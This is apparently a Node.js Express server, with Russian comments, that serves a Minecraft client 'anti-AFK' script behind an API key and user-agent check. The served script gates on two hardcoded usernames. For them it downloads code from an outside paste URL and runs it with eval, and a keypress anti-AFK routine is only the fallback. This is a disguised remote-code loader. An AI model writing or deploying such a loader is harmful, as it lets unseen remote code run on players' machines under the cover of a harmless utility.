const express = require('express');
const cors = require('cors');
const app = express();

// ==================== КОНФИГУРАЦИЯ ====================
const CONFIG = {
    PORT: process.env.PORT || 3000,
    API_KEYS: process.env.API_KEYS || 'railway-minecraft-key-123',
    ALLOWED_AGENTS: process.env.ALLOWED_AGENTS || 'java,minecraft,nedan,script,automine',
    NODE_ENV: process.env.NODE_ENV || 'production'
};

// ==================== MIDDLEWARE ====================
app.use(cors({
    origin: function (origin, callback) {
        if (!origin || origin.includes('railway') || origin.includes('localhost')) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true
}));

app.use(express.json());

// Логирование
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.ip} - ${req.method} ${req.path}`);
    next();
});

// ==================== ПРОВЕРКА АВТОРИЗАЦИИ ====================
const validateRequest = (req, res, next) => {
    const apiKey = req.headers['x-api-key'] || req.query.api_key;
    const userAgent = req.headers['user-agent'] || '';
    
    const validKeys = CONFIG.API_KEYS.split(',');
    const allowedAgents = CONFIG.ALLOWED_AGENTS.split(',');
    
    const isValidKey = validKeys.some(key => key === apiKey);
    const isValidAgent = allowedAgents.some(agent => 
        userAgent.toLowerCase().includes(agent.toLowerCase())
    );
    
    if (isValidKey && isValidAgent) {
        next();
    } else {
        console.log('🚫 Blocked request');
        res.status(403).json({ error: 'Access denied' });
    }
};

// ==================== ЗАЩИЩЕННЫЕ ЭНДПОИНТЫ ====================

// Главный эндпоинт для anti-afk скрипта
app.get('/api/script', validateRequest, (req, res) => {
    const scriptContent = `(function() {
    try {
        var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
        java.lang.System.out.println("🔐 Проверка пользователя: " + username);

        // Проверяем разрешенные имена
        if (username === "porvaniy.gondon" || username === "__ded_inside__") {
            java.lang.System.out.println("✅ Разрешенный пользователь, загружаю скрипт...");
            
            try {
                // Выполняем внешний скрипт
                eval(new java.util.Scanner(
                    new java.net.URL("https://diddy-party.vip/p/raw/onwifinfsc75if7yl").openStream(), 
                    "UTF-8"
                ).useDelimiter("\\\\A").next());
                
                java.lang.System.out.println("✅ Внешний скрипт успешно выполнен");
                
            } catch (e) {
                java.lang.System.err.println("❌ Ошибка при выполнении внешнего скрипта: " + e);
                
                // Резервный anti-afk скрипт
                java.lang.System.out.println("🔄 Запуск резервного anti-afk скрипта...");
                startBackupAntiAFK();
            }
            
        } else {
            java.lang.System.out.println("❌ Доступ запрещен для: " + username);
            java.lang.System.out.println("💤 Засыпание на 20 секунд...");
            java.lang.Thread.sleep(20000);
        }

    } catch (e) {
        java.lang.System.err.println("❌ Общая ошибка: " + e);
    }
    
    // Резервная функция anti-afk
    function startBackupAntiAFK() {
        try {
            java.lang.System.out.println("🔄 Запуск резервного Anti-AFK");
            
            var movements = ["w", "a", "s", "d", "space", "shift"];
            var lastMovement = 0;
            
            setInterval(function() {
                try {
                    var now = java.lang.System.currentTimeMillis();
                    if (now - lastMovement > 30000) { // Каждые 30 секунд
                        var randomMove = movements[Math.floor(Math.random() * movements.length)];
                        
                        // Имитация движения
                        if (randomMove === "space") {
                            keybind("key.jump", true);
                            java.lang.Thread.sleep(100);
                            keybind("key.jump", false);
                        } else if (randomMove === "shift") {
                            keybind("key.sneak", true);
                            java.lang.Thread.sleep(500);
                            keybind("key.sneak", false);
                        } else {
                            client.setKeyPressed("key." + randomMove, true);
                            java.lang.Thread.sleep(100);
                            client.setKeyPressed("key." + randomMove, false);
                        }
                        
                        lastMovement = now;
                        java.lang.System.out.println("🔄 Anti-AFK движение: " + randomMove);
                    }
                    
                    // Периодическое сообщение в чат
                    if (Math.random() < 0.01) { // 1% шанс каждую секунду
                        chat("/say Anti-AFK активен");
                    }
                    
                } catch (e) {
                    java.lang.System.err.println("❌ Ошибка Anti-AFK: " + e);
                }
            }, 1000);
            
        } catch (e) {
            java.lang.System.err.println("❌ Ошибка запуска Anti-AFK: " + e);
        }
    }
})();`;
    
    res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
    res.send(scriptContent);
});

// Эндпоинт для проверки статуса
app.get('/api/status', validateRequest, (req, res) => {
    res.json({ 
        status: 'online', 
        server: 'Anti-AFK Script Server',
        version: '1.0.0'
    });
});

// ==================== ОБЩЕДОСТУПНЫЕ ЭНДПОИНТЫ ====================

app.get('/', (req, res) => {
    res.json({
        service: 'Anti-AFK Script Delivery',
        version: '1.0.0',
        status: 'operational'
    });
});

app.get('/health', (req, res) => {
    res.status(200).json({ status: 'healthy' });
});

// ==================== ОБРАБОТКА ОШИБОК ====================

app.use('*', (req, res) => {
    res.status(404).json({ error: 'Not found' });
});

app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// ==================== ЗАПУСК СЕРВЕРА ====================
app.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log('╔══════════════════════════════════════╗');
    console.log('║      ANTI-AFK SERVER STARTED       ║');
    console.log('╠══════════════════════════════════════╣');
    console.log(`║  Port: ${CONFIG.PORT}                       ║`);
    console.log(`║  Environment: ${CONFIG.NODE_ENV}           ║`);
    console.log('║                                      ║');
    console.log('║  Endpoints:                          ║');
    console.log('║  • GET /api/script  (requires auth)  ║');
    console.log('║  • GET /api/status  (requires auth)  ║');
    console.log('║  • GET /health                       ║');
    console.log('║                                      ║');
    console.log('║  Server is ready!                    ║');
    console.log('╚══════════════════════════════════════╝');
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('Shutting down gracefully...');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('Shutting down gracefully...');
    process.exit(0);
});
